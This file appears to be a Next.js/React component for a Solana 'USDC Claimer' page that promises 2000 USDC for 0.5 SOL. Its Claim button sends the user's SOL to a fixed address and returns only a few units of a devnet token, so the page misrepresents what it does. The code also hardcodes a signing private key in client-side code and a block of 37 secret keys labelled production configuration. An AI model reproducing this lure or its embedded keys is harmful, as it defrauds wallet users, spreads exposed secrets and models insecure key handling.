/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "RSECWNJmrPc39HQRQgmUJVxMHNScX36X5ghw5Es1UekincY6b9odeuA6sxJZc8tHiD322ui51wLcox9ZC465N2v"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4Vwoa9BN2XcpUzodbMSVEtuEX3mjZd2tARUawZaCffh2YX3UHGsiSb3Pr65tDqAtazVnjuoDFBiBo53HXLCszeE8",
  "key1": "tSYPEwDUuytTX6TsAb5cbEqpKsUFptFtJSVQotqAdyKuya5DaHPgWAqFVSjUQVjxi4NfXZf5vJHYHUauqC5YmDN",
  "key2": "3hK7v3QjbLvVLv4uxd5YJTLpe9tJdRiDeNaTYoLZDFCHKiCmsQhiUanEqnNVcsbN9gqouNnsv8DLgauEQjaiz8V3",
  "key3": "2tfgSsyj3yACozLSjFbZBH764aGopPiKfuWqSZiEVWTUPGmRrBRDiSMYMMcWctxyqKfD2RT9q76BoRPGdg6c2HcM",
  "key4": "4wss2DuxynjQDP19rH4QY8LU6FCBZo5aQQWpmd2kmWaQT4SGjwbS2qKLNuigyXukX4MRn8pZ87XjuMsGw2RWuXvu",
  "key5": "3hhEgohT9JA5xR5Md8aEAsWUEnMYcyFfLTB5XiXzjiVgZRo6nH3fZ8pWD77LEJZcXiXvA9hoBbYBDHY67JB7pe8K",
  "key6": "65TqHdiH1fjpPNMrpVkvJEoYuhyMmMJnq3tx2KdA7KrKe5tUnP2NbtQhaGu8ozKzRx4ModndZGTPv1smYMyPmt5T",
  "key7": "4A5QwWgNevbSjfRGqLoEVoerHe5TsCzdrFb3YkNdjf5RPvk3QFEfr4SFuAyjEWSqNVdA8tbjnMbtUAjH1NYVhryu",
  "key8": "4t4MNmm1Kzm9TaKuk8Hr5e227zt5SALcrmUKrToyUYGz6NztfyqEGYbjw3bd1hdqdniZwjdRFPx8U8WNMhzYdSUG",
  "key9": "5DwYUZBkUar3RpZ1LxAmKjJEtXnTtAx5N7MjiFfr2YeY3E1mR6kDf3crdBdGDKsWt1NpFNXa3v9mEMWx6R9vLjLE",
  "key10": "2ufUARNUGUq12re1mwgPQrMJunMBWixRyEGS4dp1uHhYLTahxCKF8bErYpvYoza6XRkc1HpunoJKtHWFwHxTxcKv",
  "key11": "3kUp4AhnD3NamWNtEUMoMqhBrgE5294sGohS67XdzzABNpR2PGns6dKGB7rqtHNzctEjRPQZp96BxwbG9atLpEqp",
  "key12": "4CwP9eZiKLy78HZwp12hMgA9CUKiVpsqhGBdDcHkZ6tFGRnQXABHtVuCaFJkuo2j4go92i5H1vsy15nZYHnKQMko",
  "key13": "557kHn5F8hP7aUGT4vTUtfZCTZTRkRSvD3PiLXC4cFtp32WsFzsMvjSf4nXgJzv3uvPmCSmbY22Dk8bhBibcocxF",
  "key14": "2KksDSKgSVx4oujB6d6YmfkpdidHLM14RiX1EY3shgF6KHmcNqQbpzUpRgDpv7LEwTpwV9R78quW9CrewjSomsik",
  "key15": "4BL3F15TcEosSnVQDnFYJa4YMRTL1h9phzRdNhpvmiFQ5FNBiyr2fnujjRr5tjeCeuWJXJG1GX4A2jtX6UordALX",
  "key16": "27aUiQLKk9FAfpzgx2STsJN5FyG1xqeKU9JWfeTQaSYUQrhygy75yNfU3Jz2dShPuHRD9QbiTTMa1PEzB4jYdv2e",
  "key17": "xS8u5wboKeTcj9JnJVfbafh8HHY4ajnXmscfGCst3ULiSADyfAgLgYipwu1TFarforW9NsvCq7y5X7HQwyzWcz6",
  "key18": "443qRQaHPM2Eg3mtGbrZDLVFpmVJk4AZXy8uA7AUb9ddQfvyteekGMhpuMajoNFzZ9PpESK9eNjTKfLe9JT5k2oC",
  "key19": "57rD1M1aK8MQ7cQpBUqK3iyKYPA5Fmm6jerXxQyK2kLCoGSiVmR2QbaYDQjePkG83j5P5z4Bcvszi6sM2QwLt2X9",
  "key20": "RUy3Md4f6dtyr3cjpiBy9APAoPYbQk4ivk5pTHqsjLxT2FGkessnuzUBhHi8fp9pMWWBaGy5CXHbbtdKD9gQDLE",
  "key21": "4VZnjRdn8Q38zJ6KTVjzNtvjWjQ9AJ5xzSbwmTG4Tdc5LbViXVSCZUdTgUZy1MWUSZEYMK2Rn8gGj2CwwjymkRth",
  "key22": "3LfJ3wcpo4a3CLXofYwHYPg8f3AgPg1xwZegABvurk6buU2JNG5aztJ9nAYWBGTpTjVcAXbFk66cW55XA7VVfdKB",
  "key23": "ZewPPorQuQ5jrd5N8uq5qh8MJq43fpHSKMTf6zKSe7WwyLoyCXmi9J9546fEmNXHWevX9TZwuYatE2YeCcX6wP3",
  "key24": "4CyrGUML8xJJwSZC5LX3xrSSXwMLskpKNnfon7YT7A6LyDTnoBExVGE3VYhW1PDK5xiWTLhC7cgovodu2Z3tnLxH",
  "key25": "5MEPN1ZmzfJHKNRXCXpN1qsyjhVdoFMfNmR9K1CxAnhRDHmukvAXtmeUWy7N5MKvQfyhu1fL9TwtQfASpMcpnPm9",
  "key26": "4UyEVw7bym5JhCfpT94H79KF16MWTt67kxobngzq775ZNYZcd8AtiucHkTS8gcukce2hRKbTVNd1ddiigdxdy84s",
  "key27": "5TwKRoXPnXmkZyZLWyRLLnN7zbtjJYVKg4D3Ay2JZ1tGd2GTpjfNt6FguDrfLFzaq2RTvwRtyKSEMeGdVy84oCAq",
  "key28": "bXyCnFjLxvaEyTgU5gqUMDVMTFJJgSHFrpsduYKfLrtE8X66U6LmQT1MbvGQG6u4kZXE561f4WwVbSWHY1iVg5m",
  "key29": "5aKYaC1pmusKSB5E2oFG28YyTLqjgZEpF2pZBVHtGUDrJoHtqTynn6a8k8sNnAXfdTyeUGoqVf6BytYqhJkjTBzL",
  "key30": "3MbeWj9RZJiBRShBT5jvxLR2hkNF3VSnRYDUx3UdJNQqfjWBE7QHfxtbhrhCxyevSnZwkbUi4XoCMxDvXFJxJd3X",
  "key31": "49wGHBXxyiwPGcK1yWFcActv9fG5mLjRukArYS7XcLD8H8GdaZeJNs5KNFM7SgjV1481qCNv3tSvz9HyuxLTCcnT",
  "key32": "wjU8u6RbuzyaZb4yhi5Uh2MGzSvR3qzXvRWcysc6Vs81hGJKwNZm74Pu8GG4p1PLdnQbwBj5akUNU1Gbv8bqtLq",
  "key33": "5YsNQxtcTNX3matRg1NnzPjmFptt5RcZBgC5rEcN9XUNNck8WEqZEXutTioq6TZS1ex3n2143pYWLdB57mkMtb4q",
  "key34": "hET2ekSNCHepuBU7u8xJmQtkuiZGrcM54RuXR4J46vs7jr5HhteWeDbdsGNYeQz6q7tVfu46AaoXz7usdkyJiZ1",
  "key35": "3Vd6DYH1edyNkXnir2u6YD5ff2yYzfz7mH4GJ9c9zD5xBnGs78hFnnSK97JWgAC3KEbQQ58t5fATyNZ1UWbsLpgs",
  "key36": "2oWBZheuWkByEFe5JzqNUfbfLdXjZPZQDxfAcPPc7jV9KjAQFtc83PGdixBB4yN4Hi1rD4zvoThKnHwXWG56oCJ5"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
